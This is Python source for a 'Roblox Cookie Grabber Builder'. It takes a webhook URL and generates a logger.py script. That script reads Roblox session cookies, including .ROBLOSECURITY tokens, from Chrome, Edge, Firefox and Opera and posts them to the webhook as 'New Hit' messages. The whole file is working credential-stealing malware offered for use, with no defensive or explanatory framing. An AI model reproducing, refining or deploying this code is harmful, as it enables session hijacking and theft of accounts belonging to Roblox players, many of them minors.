try:
    import os
    from os import system
    system("title " + "Roblox Cookie Grabber Builder")
except:
    pass
anyerror = False
try:
  import requests
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install requests")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()

while True:
  try:
    webhook = input("Enter Webhook: ")
    re = requests.get(webhook)
    re = str(re)
    if "200" in re:
      break
    else:
      print("Webhook Invalid")
  except:
    print("Webhook Invalid")

code = """
try:
  import browser_cookie3, requests
except:
  try:
    import os
    os.system("pip install browser_cookie3")
    os.system("pip install requests")
  except:
    pass
cookies = []
cookies2 = []
try:
  ck = browser_cookie3.chrome(domain_name="roblox.com")
  cookies.append(str(ck))
except:
  pass
try:
  cl = browser_cookie3.edge(domain_name="roblox.com")
  cookies.append(str(cl))
except:
  pass
try:  
  ci = browser_cookie3.firefox(domain_name="roblox.com")
  cookies.append(str(ci))
except:
  pass
try:
  ce = browser_cookie3.opera(domain_name="roblox.com")
  cookies.append(str(ce))
except:
  pass
for cookie in cookies:
  cookie = cookie.split(".ROBLOSECURITY=")
  cookies2.append(cookie)
for cookie in cookies2:
  r = requests.post(webhook, json={"content": "@everyone ```New Hit, "+str(cookie)+"```"})
"""
try:
  file = open("logger.py", "a")
  file.write(f"webhook = '{webhook}'\n")
  file.write(code)
  file.close

  print("Logger Created")
  input("")
  exit()
except:
  print("Error While Creating")